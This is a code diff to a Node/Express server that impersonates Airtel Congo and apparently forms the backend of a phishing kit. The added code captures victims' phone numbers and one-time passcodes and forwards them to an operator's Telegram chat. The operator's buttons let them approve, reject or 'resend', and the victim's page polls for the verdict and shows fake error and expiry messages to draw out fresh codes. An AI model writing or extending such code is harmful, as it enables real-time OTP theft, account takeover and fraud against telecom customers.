@@ -21,15 +21,25 @@ if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
 }
 
 // ---------- In-memory sessions ----------
-const sessions = new Map();
+const sessions = new Map();       // login sessions
+const otpSessions = new Map();    // OTP sessions
 const SESSION_TTL_MS = 15 * 60 * 1000;
+const OTP_TTL_MS = 5 * 60 * 1000; // OTP expires after 5 minutes
 
 setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions) {
     if (now - s.createdAt > SESSION_TTL_MS) sessions.delete(id);
   }
-}, 60 * 1000);
+  for (const [id, o] of otpSessions) {
+    if (now - o.createdAt > OTP_TTL_MS && o.status === 'pending') {
+      o.status = 'expired';
+      o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
+    }
+    // hard delete 15 min after creation
+    if (now - o.createdAt > SESSION_TTL_MS) otpSessions.delete(id);
+  }
+}, 30 * 1000);
 
 // ---------- Telegram helpers ----------
 async function tgCall(method, payload, retries = 3) {
@@ -162,23 +172,61 @@ app.get('/api/status/:sessionId', (req, res) => {
   res.json({ ok: true, status: s.status, message: s.message || '' });
 });
 
+// ---------- OTP submit ----------
 app.post('/api/otp', async (req, res) => {
-  const { plan, amount, unit, validity, price, phone, otp } = req.body || {};
+  const { sessionId: loginSessionId, plan, amount, unit, validity, price, phone, otp } = req.body || {};
 
   if (!otp) {
     return res.status(400).json({ ok: false, error: 'Code OTP requis.' });
   }
 
-  console.log('📥 OTP:', { phone, otp });
+  const otpSessionId = crypto.randomBytes(12).toString('hex');
+  otpSessions.set(otpSessionId, {
+    loginSessionId: loginSessionId || null,
+    plan, amount, unit, validity, price, phone, otp,
+    status: 'pending',
+    message: '',
+    createdAt: Date.now()
+  });
 
-  await tgSend(
+  console.log('📥 OTP:', { otpSessionId, phone, otp });
+
+  const text =
     `🔢 <b>Code OTP Soumis — Airtel Congo</b>\n\n` +
     planBlock({ plan, amount, unit, validity, price }) +
     `📱 Téléphone: <b>+243 ${phone || '-'}</b>\n` +
-    `🔢 OTP: <b>${otp}</b>`
-  );
+    `🔢 OTP: <b>${otp}</b>\n\n` +
+    `🆔 OTP Session: <code>${otpSessionId}</code>`;
 
-  res.json({ ok: true });
+  const reply_markup = {
+    inline_keyboard: [[
+      { text: '✅ Approuver', callback_data: `otp-approve:${otpSessionId}` },
+      { text: '❌ Rejeter',  callback_data: `otp-reject:${otpSessionId}` },
+      { text: '🔄 Renvoyer', callback_data: `otp-resend:${otpSessionId}` }
+    ]]
+  };
+
+  await tgSend(text, reply_markup);
+
+  res.json({ ok: true, otpSessionId });
+});
+
+// ---------- OTP status (polled by otp.html) ----------
+app.get('/api/otp-status/:otpSessionId', (req, res) => {
+  const { otpSessionId } = req.params;
+  const o = otpSessions.get(otpSessionId);
+
+  if (!o) {
+    return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
+  }
+
+  // If pending and TTL passed, flip to expired
+  if (o.status === 'pending' && Date.now() - o.createdAt > OTP_TTL_MS) {
+    o.status = 'expired';
+    o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
+  }
+
+  res.json({ ok: true, status: o.status, message: o.message || '' });
 });
 
 // ---------- Telegram webhook ----------
@@ -189,58 +237,72 @@ app.post('/api/telegram-webhook', async (req, res) => {
   if (update.callback_query) {
     const cq = update.callback_query;
     const data = cq.data || '';
-    const [action, sessionId] = data.split(':');
+    const [action, id] = data.split(':');
     const msg = cq.message;
     const fromId = String(cq.from && cq.from.id);
 
-    console.log('📲 Callback:', { action, sessionId, from: fromId });
+    console.log('📲 Callback:', { action, id, from: fromId });
 
-    // Security: only the configured admin can act
     if (fromId !== CHAT_ID) {
       await tgAnswerCallback(cq.id, 'Non autorisé.');
       return res.sendStatus(200);
     }
 
-    const s = sessions.get(sessionId);
-
-    if (!s) {
-      await tgAnswerCallback(cq.id, 'Session introuvable ou expirée.');
-      if (msg) {
-        await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + '\n\n⚠️ <b>Session expirée</b>');
+    // ---- LOGIN approve / reject (existing) ----
+    if (action === 'approve' || action === 'reject') {
+      const s = sessions.get(id);
+      if (!s) {
+        await tgAnswerCallback(cq.id, 'Session introuvable ou expirée.');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + '\n\n⚠️ <b>Session expirée</b>');
+        return res.sendStatus(200);
+      }
+      if (action === 'approve') {
+        s.status = 'approved';
+        s.message = 'Approuvé';
+        await tgAnswerCallback(cq.id, '✅ Approuvé');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n✅ <b>APPROUVÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
+      } else {
+        s.status = 'rejected';
+        s.message = 'Numéro incorrect. Veuillez vérifier et réessayer.';
+        await tgAnswerCallback(cq.id, '❌ Rejeté');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
       }
       return res.sendStatus(200);
     }
 
-    if (action === 'approve') {
-      s.status = 'approved';
-      s.message = 'Approuvé';
-      await tgAnswerCallback(cq.id, '✅ Approuvé');
-      if (msg) {
-        await tgEditMessage(
-          msg.chat.id,
-          msg.message_id,
-          (msg.text || '') + `\n\n✅ <b>APPROUVÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`
-        );
+    // ---- OTP approve / reject / resend ----
+    if (action === 'otp-approve' || action === 'otp-reject' || action === 'otp-resend') {
+      const o = otpSessions.get(id);
+      if (!o) {
+        await tgAnswerCallback(cq.id, 'Session OTP introuvable ou expirée.');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + '\n\n⚠️ <b>Session OTP expirée</b>');
+        return res.sendStatus(200);
       }
-    } else if (action === 'reject') {
-      s.status = 'rejected';
-      s.message = 'Numéro incorrect. Veuillez vérifier et réessayer.';
-      await tgAnswerCallback(cq.id, '❌ Rejeté');
-      if (msg) {
-        await tgEditMessage(
-          msg.chat.id,
-          msg.message_id,
-          (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`
-        );
+
+      if (action === 'otp-approve') {
+        o.status = 'approved';
+        o.message = 'Approuvé';
+        await tgAnswerCallback(cq.id, '✅ Approuvé');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n✅ <b>APPROUVÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
+      } else if (action === 'otp-reject') {
+        o.status = 'rejected';
+        o.message = 'Code OTP incorrect. Veuillez réessayer.';
+        await tgAnswerCallback(cq.id, '❌ Rejeté');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
+      } else { // otp-resend
+        o.status = 'expired';
+        o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
+        await tgAnswerCallback(cq.id, '🔄 Renvoyé');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n🔄 <b>RENVOYÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
       }
-    } else {
-      await tgAnswerCallback(cq.id, 'Action inconnue.');
+      return res.sendStatus(200);
     }
 
+    await tgAnswerCallback(cq.id, 'Action inconnue.');
     return res.sendStatus(200);
   }
 
-  // 2) Text commands (optional fallback)
+  // 2) Text commands fallback
   const msg = update.message;
   if (msg && msg.text && String(msg.chat.id) === CHAT_ID) {
     const text = msg.text.trim();
@@ -249,10 +311,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
     if (text === '/help' || text === '/start') {
       await tgSend(
         `🤖 <b>Airtel Congo — Admin</b>\n\n` +
-        `Approuvez ou rejetez chaque connexion via les boutons sous chaque message.\n\n` +
-        `Commandes manuelles (fallback):\n` +
-        `/approve &lt;sessionId&gt;\n` +
-        `/reject &lt;sessionId&gt;`
+        `Utilisez les boutons inline sous chaque message:\n` +
+        `• Connexion → ✅ Approuver / ❌ Rejeter\n` +
+        `• OTP → ✅ Approuver / ❌ Rejeter / 🔄 Renvoyer`
       );
     }
   } else {
